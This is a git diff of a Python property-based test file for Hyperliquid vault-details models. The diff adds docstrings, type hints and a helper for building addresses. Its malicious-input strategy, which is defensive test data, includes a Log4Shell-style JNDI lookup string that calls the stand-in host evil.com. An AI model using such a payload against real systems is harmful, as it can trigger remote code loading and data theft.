@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw vault details models.
 
 These tests validate critical security boundary models that process external vault details data.
-The models tested here are essential for vault management, performance tracking, and user equity management.
+The models tested here are essential for vault management and performance tracking.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious vault details data that could manipulate vault information
@@ -36,13 +36,38 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
+# =============================================================================
+# HELPER FUNCTIONS
+# =============================================================================
+
+
+def _create_hex_address(hex_part: str) -> str:
+    """Create hexadecimal address with 0x prefix.
+
+    Args:
+        hex_part: Hexadecimal string part
+
+    Returns:
+        Address string with 0x prefix
+    """
+    return f"0x{hex_part}"
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR VAULT DETAILS MODEL TESTING
 # =============================================================================
 
 
 def valid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses for vault-related addresses."""
+    """Generate valid Ethereum addresses for vault-related addresses.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid addresses
         st.sampled_from([
@@ -55,14 +80,18 @@ def valid_ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated valid addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _create_hex_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate invalid Ethereum address strings."""
+    """Generate invalid Ethereum address strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Wrong length
         st.text(min_size=1, max_size=39, alphabet=string.hexdigits),
@@ -78,7 +107,11 @@ def invalid_ethereum_address_strategy() -> SearchStrategy[str]:
 
 
 def financial_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for financial amounts."""
+    """Generate valid decimal strings for financial amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common financial values
         st.decimals(
@@ -107,7 +140,11 @@ def financial_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def pnl_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for PnL (can be negative)."""
+    """Generate valid decimal strings for PnL (can be negative).
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common PnL values (positive and negative)
         st.decimals(
@@ -127,7 +164,11 @@ def pnl_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def invalid_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate invalid decimal strings."""
+    """Generate invalid decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Non-finite values
         st.just("NaN"),
@@ -146,7 +187,11 @@ def invalid_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp values."""
+    """Generate valid timestamp values.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.one_of([
         # Valid timestamp ranges
         st.integers(min_value=0, max_value=2**63 - 1),
@@ -161,7 +206,11 @@ def timestamp_strategy() -> SearchStrategy[int]:
 
 
 def vault_name_strategy() -> SearchStrategy[str]:
-    """Generate valid vault names."""
+    """Generate valid vault names.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.text(min_size=1, max_size=100).filter(lambda x: x.strip()),
         st.sampled_from([
@@ -175,7 +224,11 @@ def vault_name_strategy() -> SearchStrategy[str]:
 
 
 def vault_description_strategy() -> SearchStrategy[str]:
-    """Generate valid vault descriptions."""
+    """Generate valid vault descriptions.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.text(min_size=0, max_size=1000),
         st.sampled_from([
@@ -189,7 +242,11 @@ def vault_description_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_performance_history_item_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid performance history item data."""
+    """Generate valid performance history item data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "time": draw(timestamp_strategy()),
         "pnl": draw(pnl_decimal_string_strategy()),
@@ -198,7 +255,11 @@ def valid_performance_history_item_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_user_equity_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid user equity data."""
+    """Generate valid user equity data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "user": draw(valid_ethereum_address_strategy()),
         "equity": draw(financial_decimal_string_strategy()),
@@ -211,7 +272,11 @@ def valid_user_equity_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_relationship_data_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid relationship data."""
+    """Generate valid relationship data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "childAddresses": draw(
             st.lists(
@@ -225,7 +290,11 @@ def valid_relationship_data_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_relationship_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid relationship data."""
+    """Generate valid relationship data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "type": draw(st.sampled_from(["parent", "child", "standalone"])),
         "data": draw(valid_relationship_data_strategy()),
@@ -234,7 +303,11 @@ def valid_relationship_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_vault_details_response_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid vault details response data."""
+    """Generate valid vault details response data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "name": draw(vault_name_strategy()),
         "description": draw(vault_description_strategy()),
@@ -267,8 +340,12 @@ def valid_vault_details_response_strategy(draw: st.DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_vault_details_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for vault details security testing."""
+def malicious_vault_details_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for vault details security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Vault details manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-vault-details}"),
@@ -314,13 +391,13 @@ def malicious_vault_details_strategy() -> SearchStrategy[Any]:
 
 
 class TestHyperliquidRawVaultPerformanceHistoryItemProperties:
-    """Property-based tests for HyperliquidRawVaultPerformanceHistoryItem validation and security."""
+    """Property-based tests for HyperliquidRawVaultPerformanceHistoryItem."""
 
     @given(item_data=valid_performance_history_item_strategy())
     def test_performance_history_item_validation_success_properties(
         self, item_data: dict[str, Any]
     ) -> None:
-        """Property: Valid performance history item data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             # Validate timestamp
@@ -352,10 +429,10 @@ class TestHyperliquidRawVaultPerformanceHistoryItemProperties:
         malicious_value=malicious_vault_details_strategy(),
     )
     def test_performance_history_item_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Performance history item model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Performance history item model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "time": 1700926145201,
             "pnl": "123.45",
         }
@@ -376,7 +453,7 @@ class TestHyperliquidRawVaultUserEquityProperties:
 
     @given(equity_data=valid_user_equity_strategy())
     def test_user_equity_validation_success_properties(self, equity_data: dict[str, Any]) -> None:
-        """Property: Valid user equity data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             # Validate user address
@@ -448,7 +525,7 @@ class TestHyperliquidRawVaultRelationshipDataProperties:
     def test_relationship_data_validation_success_properties(
         self, relationship_data: dict[str, Any]
     ) -> None:
-        """Property: Valid relationship data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             child_addresses = relationship_data["childAddresses"]
@@ -474,7 +551,7 @@ class TestHyperliquidRawVaultRelationshipProperties:
 
     @given(relationship=valid_relationship_strategy())
     def test_relationship_validation_success_properties(self, relationship: dict[str, Any]) -> None:
-        """Property: Valid relationship data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             assume(isinstance(relationship["type"], str))
@@ -512,7 +589,7 @@ class TestHyperliquidRawVaultDetailsResponseProperties:
     def test_vault_details_response_validation_success_properties(
         self, vault_data: dict[str, Any]
     ) -> None:
-        """Property: Valid vault details data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             # Validate required string fields
@@ -588,10 +665,10 @@ class TestHyperliquidRawVaultDetailsResponseProperties:
         malicious_value=malicious_vault_details_strategy(),
     )
     def test_vault_details_response_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Vault details response should reject malicious inputs safely."""
-        base_data = {
+        """Property: Vault details response should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "name": "Test Vault",
             "description": "A vault for testing",
             "allowDeposits": True,
@@ -633,10 +710,10 @@ class TestHyperliquidRawVaultDetailsIntegrationProperties:
         malicious_value=malicious_vault_details_strategy(),
     )
     def test_vault_details_batch_processing_properties(
-        self, vault_details_list: list[dict[str, Any]], malicious_value: Any
+        self, vault_details_list: list[dict[str, Any]], malicious_value: MaliciousInput
     ) -> None:
         """Property: Multiple vault details should be processed independently."""
-        valid_vaults = []
+        valid_vaults: list[HyperliquidRawVaultDetailsResponse] = []
 
         for vault_data in vault_details_list:
             # Skip invalid vaults
@@ -663,7 +740,7 @@ class TestHyperliquidRawVaultDetailsIntegrationProperties:
 
         # Property: Malicious value should be rejected when injected
         if valid_vaults:
-            corrupted_data = {
+            corrupted_data: dict[str, Any] = {
                 "name": malicious_value,
                 "description": "A vault for testing",
                 "allowDeposits": True,
